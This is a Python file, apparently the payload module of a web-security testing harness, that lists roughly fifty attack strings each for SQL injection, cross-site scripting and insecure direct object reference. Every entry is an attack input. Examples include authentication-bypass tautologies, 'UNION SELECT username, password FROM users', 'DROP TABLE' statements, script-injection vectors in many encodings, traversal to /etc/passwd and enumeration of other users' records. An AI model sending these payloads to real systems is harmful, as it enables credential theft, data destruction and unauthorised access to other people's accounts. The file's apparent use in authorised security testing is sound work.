# attacker/payloads.py
# ~50 payloads per category (SQLi, XSS, IDOR)
PAYLOADS = {
    "sqli": [
        # basic
        "1' OR '1'='1",
        "1' OR '1'='1' -- ",
        "' OR '1'='1' /*",
        "' OR 1=1-- -",
        "1 OR 1=1",
        "' OR ''=''",
        # variations with comments/encoding
        "1' OR '1'='1' #",
        "admin' -- ",
        "%27 OR %271%27=%271%27--",
        "1') OR ('1'='1",
        "1' OR '1'='1'/*",
        # union/select patterns
        "' UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "UNION+SELECT+NULL--",
        "UNION%20SELECT%20NULL--",
        # boolean/logical
        "' AND 1=(SELECT COUNT(*) FROM users); --",
        "' AND 'a'='a",
        "' OR 'x'='x'",
        # time-based / blind-like (safe strings)
        "' OR SLEEP(0) --",
        "1 OR SLEEP(0)",
        "1; WAITFOR DELAY '0:0:0'--",
        # tautologies, encodings, edgecases
        "0x27||0x27=0x27",
        "1%20OR%201=1",
        "%27%20OR%20%271%27=%271%27--",
        "' OR 1=1#",
        "' OR '1'='1'-- -",
        # nested and concatenations
        "1' OR EXISTS(SELECT 1 FROM users)--",
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' OR (SELECT TOP 1 name FROM sys.objects)='a'--",
        # attempts with fields
        "'; DROP TABLE IF EXISTS tmp_table; --",
        "1 OR '1'='1' ORDER BY 1--",
        "1 OR '1'='1' GROUP BY 1--",
        # common DB engine patterns
        "' OR '1'='1' -- -",
        "or 1=1 --",
        "or 'a'='a' --",
        # special chars / long payloads
        "'" + "A"*50,
        "%27" + "A"*40,
        "' OR '1'='1' /*comment*/",
        # encoded/percent encoded
        "%27%20OR%20%271%27=%271%27%20--%20",
        "1' OR '1'='1'/*",
        # tricky param tamperings
        "id=1;--",
        "id=1 OR 1=1",
        "1 OR '1'='1'-- -%00",
        # short forms
        "' OR ''='",
        "' OR 1=1--",
        "\" OR \"\"=\"",
        # final diverse samples
        "0 or 0=0",
        "1 /*'*/ or 1=1",
        "' OR LENGTH(version())>0 --",
        "1' OR '1'='1' /* long padding */" + "B"*30,
    ],

    "xss": [
        # simple
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        # encoded
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "%3Csvg%2Fonload%3Dalert%281%29%3E",
        # attribute-based, variations
        "'><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        # event handlers
        "<a href=\"#\" onclick=\"alert(1)\">x</a>",
        "<div onmouseover=alert(1)>hover</div>",
        # data URI
        "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        # long payloads / obfuscations
        "<script>/*comment*/alert('x')</script>",
        "<scr\0ipt>alert(1)</scr\0ipt>",
        "<svg><script>alert(1)</script></svg>",
        # nested encodings
        "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
        # HTML entities
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        # attribute injection
        "\" onerror=\"alert(1)\" \"",
        # IE-specific / obscure
        "<img src=x onerror=javascript:alert(1)>",
        "<svg/onload=/*--><script>alert(1)</script>",
        # polyglot / unary forms
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        # less-than variants
        "<img src=1 onerror=alert`1`>",
        "<math><mi><script>alert(1)</script></mi></math>",
        # long / fuzzed
        "<script>" + "A"*100 + ";</script>",
        "%3Ciframe%20src%3D%27javascript:alert(1)%27%3E%3C/iframe%3E",
        # javascript: in hrefs
        "<a href=\"javascript:alert(1)\">x</a>",
        # unicode obfuscation
        "\u003Cscript\u003Ealert(1)\u003C/script\u003E",
        # closing tags injection
        "</title><script>alert(1)</script>",
        # SVG + attributes combos
        "<svg><g><script>alert(1)</script></g></svg>",
        # onfocus attr
        "<input autofocus onfocus=alert(1)>",
        # long URL-encoded
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        # mixed-case and noise
        "<ScRipT>alert(1)</sCriPt>",
        # combination
        "<svg/onload=alert(1)><!--",
        # final variants to reach ~50
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "\";alert(1);//",
        "<script>/*x*/alert(1)</script>",
        "<img src=x onerror=confirm(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "%3Csvg%2Fonload%3Dalert(1)%3E",
        "<form action=javascript:alert(1)><input type=submit></form>",
    ],

    "idor": [
        # direct object references / path traversal / ID tampering
        "/rest/user/1",
        "/rest/user/2",
        "/rest/user/3",
        "/rest/user/4",
        "/rest/user/5",
        "/rest/user/6",
        "/rest/user/10",
        "/rest/user/99",
        "/rest/user/100",
        "/rest/user/999",
        "/rest/user/1000",
        "/rest/user/9999",
        # out-of-range attempts
        "/rest/user/0",
        "/rest/user/-1",
        "/rest/user/2147483647",
        # common tampering patterns
        "/rest/user/1%20OR%201=1",
        "/rest/user/1%27%20OR%20%271%27=%271%27",
        "/rest/user/1; DROP TABLE users;",
        "/rest/user/../../etc/passwd",
        "/rest/user/../admin",
        "/rest/user/2%2F..%2Fadmin",
        # numeric + long
        "/rest/user/00001",
        "/rest/user/00002",
        "/rest/user/00003",
        "/rest/user/00004",
        # id in query string forms
        "/api/user?id=1",
        "/api/user?id=2",
        "/api/user?id=3",
        "/api/user?id=999",
        "/api/user?id=1000",
        # parameter name manipulations
        "/api/user?user_id=1",
        "/api/user?userid=1",
        "/api/user?id=1%20OR%201=1",
        # attempts to access other resources via id
        "/orders/1",
        "/orders/2",
        "/orders/3",
        "/orders/999",
        "/orders/1000",
        # long id / fuzz
        "/rest/user/" + "9"*50,
        "/rest/user/" + "1"*30,
        "/rest/user/7777777",
        # encoded attempts
        "/rest/user/%2e%2e%2fadmin",
        "/rest/user/%2e%2e/%2e%2e/etc/passwd",
        # combinations
        "/rest/user/1?role=admin",
        "/rest/user/1?is_admin=1",
        "/rest/user/1?user=2",
    ]
}

